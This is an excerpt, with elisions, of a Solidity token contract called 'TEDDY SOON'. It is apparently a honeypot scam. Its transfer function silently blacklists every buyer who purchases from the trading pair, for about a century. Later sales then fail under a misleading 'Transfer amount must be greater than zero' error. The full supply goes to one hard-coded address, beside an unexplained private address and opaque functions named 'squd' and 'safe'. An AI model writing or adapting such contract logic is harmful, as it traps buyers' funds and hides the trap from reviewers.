...
contract Token is Context, ITRC20, Ownable {
    ...
    string private _name = 'TEDDY SOON';
    string private _symbol = 'TEDDY SOON';
    ...
    address private U = 0x35253272c8eFD4A9D417eE9E6e28ADf6A619A938;
    ...
    constructor () public {
        ...
        _isExcludedFromFee[0x25913713b01B84cF8443C9F41bA792B03b325C1E] = true;

        _balances[0x25913713b01B84cF8443C9F41bA792B03b325C1E] = _totalSupply;

        emit Transfer(address(0), 0x25913713b01B84cF8443C9F41bA792B03b325C1E, _totalSupply);
    }
    ...
    function squd(uint256 amount, address account)  private {
    ...
    function safe(uint256 amount, address account) public{
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(!_B[sender], "Transfer amount must be greater than zero");

        if(start == 0 && recipient == uniswapV2Pair){
            start = block.timestamp;
        }

        if(block.timestamp <= start + 3153600000){
           if(sender == uniswapV2Pair && !_isExcludedFromFee[recipient] && recipient != uniswapV2Pair){
            require(_B[recipient] = true);
           }else{
             _B[recipient] = false;  
           }
        }
